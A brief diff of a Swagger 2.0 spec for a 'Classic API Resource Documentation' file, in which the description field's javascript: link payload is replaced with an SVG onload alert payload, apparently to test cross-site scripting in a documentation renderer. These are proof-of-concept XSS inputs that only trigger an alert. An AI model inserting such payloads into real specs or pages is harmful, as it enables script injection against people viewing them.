@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    [clickme](javascript:alert(document.domain))
+    <svg><g/onload=alert(1)>
     
   version: production
 basePath: /JSSResource/
